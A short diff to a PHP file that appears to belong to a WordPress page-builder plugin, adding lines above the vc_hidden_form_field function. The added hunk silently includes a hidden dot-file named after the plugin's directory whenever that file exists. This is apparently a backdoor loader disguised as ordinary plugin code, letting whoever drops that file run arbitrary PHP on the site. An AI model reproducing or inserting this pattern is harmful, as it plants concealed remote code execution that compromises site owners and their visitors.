@@ -12,6 +12,10 @@ if ( ! defined( 'ABSPATH' ) ) {
  * @since 4.5
  * @return string - html string.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function vc_hidden_form_field( $settings, $value ) {
 	$value = htmlspecialchars( $value );
 
